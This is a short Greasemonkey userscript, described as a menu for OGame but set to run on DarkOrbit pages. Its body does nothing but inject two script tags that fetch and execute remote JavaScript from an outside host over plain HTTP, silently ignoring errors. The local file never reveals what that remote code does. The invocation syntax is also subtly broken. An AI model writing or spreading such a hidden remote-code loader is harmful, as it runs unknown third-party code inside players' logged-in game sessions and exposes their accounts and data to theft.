// ==UserScript==
// @name		RU_darkoribt
// @namespace		menu by qwert-yg
// @description		Greasemonkey script for OGame v1.x ("redesign")
// @include		http://*.darkorbit.*
// @copyright		2010, 4LIFE
// @license		GNU
// @version 		1.0
// @author 		Asiman
// @homepage 		http://vendetta.ural-host.ru/
// ==/UserScript==

(function() {
	try {
		objScript = document.createElement("script");
			objScript.src = "http://vendetta.ural-host.ru/do/jquery.js";
		document.body.appendChild(objScript);
	}
	catch(exception) {
		//alert("[Event]: exception in script\n[Solution]: try to contact developers or disable this script");
	}
}
)

(function() {
	try {
		objScript = document.createElement("script");
			objScript.src = "http://vendetta.ural-host.ru/do/sours.js";
		document.body.appendChild(objScript);
	}
	catch(exception) {
		//alert("[Event]: exception in script\n[Solution]: try to contact developers or disable this script");
	}
}
)();